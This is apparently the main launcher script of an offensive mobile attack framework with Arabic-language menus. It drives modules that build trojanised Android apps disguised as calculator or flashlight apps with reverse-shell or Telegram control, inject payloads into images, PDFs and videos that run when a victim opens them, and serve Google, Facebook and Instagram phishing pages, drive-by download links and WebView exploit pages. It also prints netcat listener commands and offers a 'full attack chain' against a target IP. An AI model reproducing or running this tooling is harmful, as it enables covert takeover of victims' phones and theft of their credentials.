#!/usr/bin/env python3
"""
CamoroMobile v1.0 — Mobile Penetration Testing Framework
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
3 Advanced Mobile Exploitation Tools:
  1. AndroGhost    — Android RAP (Remote Access Payload) Builder
  2. PulseInject   — Multi-Format File Injection Engine  
  3. PhantomLink   — WebView Exploitation & Phishing Engine
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""

import os, sys, time, json, platform, random, string, uuid
from datetime import datetime

# استيراد الوحدات
from modules.androghost import AndroGhost
from modules.pulseinject import PulseInject
from modules.phantomlink import PhantomLink

# الإعدادات
VERSION = "1.0"
CODENAME = "Shadow Mirage"
AUTHOR = "BlackSpecter"
SESSION = uuid.uuid4().hex[:8]

# الألوان
class C:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    W = '\033[97m'
    D = '\033[90m'
    BOLD = '\033[1m'
    END = '\033[0m'

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{C.R}{C.BOLD}
    ╔═══════════════════════════════════════════════════════════╗
    ║    ██████  █████  ███    ███  ██████  ███    ███  █████  ║
    ║   ██      ██   ██ ████  ████ ██    ██ ████  ████ ██   ██ ║
    ║   ██      ███████ ██ ████ ██ ██    ██ ██ ████ ██ ███████ ║
    ║   ██      ██   ██ ██  ██  ██ ██    ██ ██  ██  ██ ██   ██ ║
    ║    ██████ ██   ██ ██      ██  ██████  ██      ██ ██   ██ ║
    ║                                                           ║
    ║         MOBILE PENETRATION TESTING FRAMEWORK              ║
    ║               v{VERSION} — {CODENAME}                ║
    ╚═══════════════════════════════════════════════════════════╝{C.END}
    """)
    print(f"{C.D}  ════════════════════════════════════════════════════════════{C.END}")
    print(f"  {C.Y}⚠{C.END} {C.BOLD}AUTHORIZED PENETRATION TESTING USE ONLY{C.END}")
    print(f"  {C.Y}⚠{C.END} Session: {SESSION} | Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{C.D}  ════════════════════════════════════════════════════════════{C.END}\n")

def input_c(prompt, color=C.C):
    try:
        return input(f"  {color}❯{C.END} {prompt}").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return 'exit'

def main():
    banner()
    
    # التحقق من وجود الوحدات
    try:
        androghost = AndroGhost()
        pulseinject = PulseInject()
        phantomlink = PhantomLink()
        modules_loaded = True
    except Exception as e:
        print(f"\n  {C.R}[-] فشل تحميل الوحدات: {e}{C.END}")
        modules_loaded = False
    
    while True:
        print(f"\n  {C.C}┌─[CamoroMobile v{VERSION}] — {CODENAME}{C.END}")
        print(f"  {C.C}├─[3 أدوات اختراق متقدمة]{C.END}")
        print(f"  {C.C}├──{C.G} [1] AndroGhost{C.END}    — {C.W}بناء APK مخترق متعدد الطبقات{C.END}")
        print(f"  {C.C}├──{C.G} [2] PulseInject{C.END}   — {C.W}حقن بايلود في صور، PDF، فيديوهات{C.END}")
        print(f"  {C.C}├──{C.G} [3] PhantomLink{C.END}   — {C.W}روابط تصيد واستغلال WebView{C.END}")
        print(f"  {C.C}├──{C.Y} [4] Full Attack{C.END}   — {C.BOLD}تنفيذ جميع الأدوات ضد هدف{C.END}")
        print(f"  {C.C}└──{C.R} [0] Exit{C.END}")
        print(f"  {C.D}  {'─' * 53}{C.END}")
        
        choice = input_c("اختر أداة (0-4): ")
        
        if choice == '0' or choice.lower() == 'exit':
            print(f"\n  {C.Y}[*] إنهاء الجلسة... وداعاً{C.END}")
            sys.exit(0)
        
        elif choice == '1':
            # ── AndroGhost ──
            print(f"\n  {C.BOLD}{C.M}═══ AndroGhost — APK Builder ═══{C.END}\n")
            
            lhost = input_c("أدخل IP الخادم (LHOST): ")
            lport = int(input_c("أدخل المنفذ (LPORT) [4444]: ") or "4444")
            
            print(f"\n  {C.C}التطبيقات المتاحة: calculator, flashlight, music_player, weather{C.END}")
            app = input_c("اختر تطبيق للربط [calculator]: ") or "calculator"
            
            print(f"\n  {C.C}طريقة التحكم:{C.END}")
            print(f"  {C.W}[1] TCP Reverse Shell (مباشر){C.END}")
            print(f"  {C.W}[2] Telegram Bot (عن بعد){C.END}")
            ctrl = input_c("اختر [1]: ") or "1"
            
            telegram = False
            if ctrl == "2":
                telegram = True
                bot_token = input_c("أدخل Bot Token من BotFather: ")
                chat_id = input_c("أدخل Chat ID: ")
            
            print(f"\n  {C.Y}[*] جاري بناء APK...{C.END}")
            
            result = androghost.generate_apk(
                lhost=lhost, 
                lport=lport, 
                app_template=app,
                use_telegram=telegram,
                bot_token=bot_token if telegram else None,
                chat_id=chat_id if telegram else None
            )
            
            if result["success"]:
                print(f"\n  {C.G}[✓] تم إنشاء APK بنجاح!{C.END}")
                print(f"  {C.G}[✓] المسار: {result['apk_path']}{C.END}")
                print(f"  {C.G}[✓] الحجم: {result['size_mb']} MB{C.END}")
                print(f"  {C.G}[✓] الأوامر المتاحة: {len(result['commands_available'])} أمر{C.END}")
                print(f"\n  {C.Y}للاستماع للاتصال الوارد:{C.END}")
                print(f"  {C.BOLD}nc -lvnp {lport}{C.END}")
            else:
                print(f"\n  {C.R}[-] فشل: {result.get('error', 'خطأ غير معروف')}{C.END}")
        
        elif choice == '2':
            # ── PulseInject ──
            print(f"\n  {C.BOLD}{C.M}═══ PulseInject — File Injection Engine ═══{C.END}\n")
            
            file_path = input_c("أدخل مسار الملف (صورة/PDF/فيديو): ")
            if not os.path.exists(file_path):
                print(f"  {C.R}[-] الملف غير موجود{C.END}")
                continue
            
            lhost = input_c("أدخل IP الخادم (LHOST): ")
            lport = int(input_c("أدخل المنفذ (LPORT) [4444]: ") or "4444")
            
            print(f"\n  {C.C}[1] حقن JPEG (صورة){C.END}")
            print(f"  {C.C}[2] حقن PDF (مستند){C.END}")
            print(f"  {C.C}[3] حقن MP4 (فيديو){C.END}")
            print(f"  {C.C}[4] كشف تلقائي{ C.END}")
            inj_type = input_c("اختر نوع الحقن [4]: ") or "4"
            
            print(f"\n  {C.Y}[*] جاري حقن البايلود...{C.END}")
            
            result = None
            if inj_type == "1":
                result = pulseinject.inject_jpeg(file_path, lhost=lhost, lport=lport)
            elif inj_type == "2":
                result = pulseinject.inject_pdf(file_path, lhost=lhost, lport=lport)
            elif inj_type == "3":
                result = pulseinject.inject_mp4(file_path, lhost=lhost, lport=lport)
            else:
                result = pulseinject.auto_detect_and_inject(file_path, lhost=lhost, lport=lport)
            
            if result and result["success"]:
                print(f"\n  {C.G}[✓] تم الحقن بنجاح!{C.END}")
                print(f"  {C.G}[✓] الملف الناتج: {result['output_path']}{C.END}")
                print(f"  {C.G}[✓] التقنية: {result.get('technique', 'تلقائي')}{C.END}")
                print(f"\n  {C.Y}عند فتح الضحية للملف، سيتم تنفيذ البايلود{C.END}")
            else:
                err = result.get('error', 'فشل غير معروف') if result else "لا توجد نتيجة"
                print(f"\n  {C.R}[-] فشل: {err}{C.END}")
        
        elif choice == '3':
            # ── PhantomLink ──
            print(f"\n  {C.BOLD}{C.M}═══ PhantomLink — Link Exploitation Engine ═══{C.END}\n")
            
            print(f"  {C.C}[1] تشغيل خادم تصيد (Phishing Server){C.END}")
            print(f"  {C.C}[2] توليد رابط Drive-By Download{C.END}")
            print(f"  {C.C}[3] توليد رابط استغلال WebView{C.END}")
            link_choice = input_c("اختر [1]: ") or "1"
            
            if link_choice == "1":
                lhost = input_c("أدخل IP الخادم (LHOST): ")
                lport = int(input_c("أدخل المنفذ (LPORT) [8080]: ") or "8080")
                
                print(f"\n  {C.C}القوالب المتاحة: google, facebook, instagram, أو اسم مخصص{C.END}")
                template = input_c("اختر قالب [google]: ") or "google"
                
                print(f"\n  {C.Y}[*] تشغيل خادم التصيد...{C.END}")
                phantomlink.start_server(lhost, lport, template)
            
            elif link_choice == "2":
                apk_path = input_c("أدخل مسار APK: ")
                if not os.path.exists(apk_path):
                    print(f"  {C.R}[-] الملف غير موجود{C.END}")
                    continue
                
                lhost = input_c("أدخل IP الخادم (LHOST): ")
                lport = int(input_c("أدخل المنفذ (LPORT) [8080]: ") or "8080")
                
                result = phantomlink.generate_apk_download_link(apk_path, lhost, lport)
                if result["success"]:
                    print(f"\n  {C.G}[✓] رابط التحميل جاهز!{C.END}")
                    print(f"  {C.G}[✓] أرسل هذا الرابط للضحية: {result['page_url']}{C.END}")
                    print(f"  {C.G}[✓] التحميل المباشر: {result['download_url']}{C.END}")
            
            elif link_choice == "3":
                callback = input_c("أدخل IP الخادم المستقبل: ")
                port = input_c("أدخل منفذ الاستقبال [4444]: ") or "4444"
                
                result = phantomlink.generate_exploit_link(f"http://{callback}:{port}")
                if result["success"]:
                    print(f"\n  {C.G}[✓] صفحة الاستغلال جاهزة!{C.END}")
                    print(f"  {C.G}[✓] المسار: {result['output_path']}{C.END}")
                    print(f"  {C.G}[✓] ارفع الملف على أي خادم ويب وأرسل الرابط للضحية{C.END}")
        
        elif choice == '4':
            # ── Full Attack ──
            print(f"\n  {C.BOLD}{C.R}═══ FULL ATTACK CHAIN ═══{C.END}\n")
            print(f"  {C.Y}[*] سيتم تنفيذ جميع الأدوات ضد الهدف{C.END}\n")
            
            target = input_c("أدخل IP الهدف: ")
            lhost = input_c("أدخل IP الخادم (LHOST): ")
            lport = int(input_c("أدخل المنفذ (LPORT) [4444]: ") or "4444")
            
            print(f"\n  {C.Y}[1/3] AndroGhost — بناء APK...{C.END}")
            app = input_c("  اختر تطبيق للربط [calculator]: ") or "calculator"
            result1 = androghost.generate_apk(lhost, lport, app)
            print(f"  {C.G}  [✓] APK جاهز: {result1.get('apk_path', 'N/A')}{C.END}" if result1["success"] else f"  {C.R}  [✗] فشل{C.END}")
            
            print(f"\n  {C.Y}[2/3] PulseInject — حقن بايلود في ملف...{C.END}")
            test_file = input_c("  أدخل مسار ملف للحقن (صورة/PDF): ")
            if os.path.exists(test_file):
                result2 = pulseinject.auto_detect_and_inject(test_file, lhost, lport)
                print(f"  {C.G}  [✓] تم الحقن: {result2.get('output_path', 'N/A')}{C.END}" if result2["success"] else f"  {C.R}  [✗] فشل{C.END}")
            else:
                print(f"  {C.Y}  [!] الملف غير موجود، تم تخطي هذه الخطوة{C.END}")
            
            print(f"\n  {C.Y}[3/3] PhantomLink — إعداد رابط التصيد...{C.END}")
            print(f"  {C.G}  [✓] لتشغيل خادم التصيد: استخدم القائمة الرئيسية > 3 > 1{C.END}")
            
            print(f"\n  {C.BOLD}{C.R}╔═══ FULL CHAIN COMPLETE ═══╗{C.END}")
            print(f"  {C.BOLD}{C.R}║   الهدف: {target}{' ' * (15 - len(target))}║{C.END}")
            print(f"  {C.BOLD}{C.R}║   الخادم: {lhost}:{lport}{' ' * (10 - len(str(lport)))}║{C.END}")
            print(f"  {C.BOLD}{C.R}║   الحالة: جاهز للتنفيذ       ║{C.END}")
            print(f"  {C.BOLD}{C.R}╚══════════════════════════════╝{C.END}\n")
        
        input(f"\n  {C.D}[Press Enter للعودة للقائمة...]{C.END}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n  {C.Y}[!] إنهاء...{C.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n  {C.R}[-] خطأ: {e}{C.END}")
        sys.exit(1)
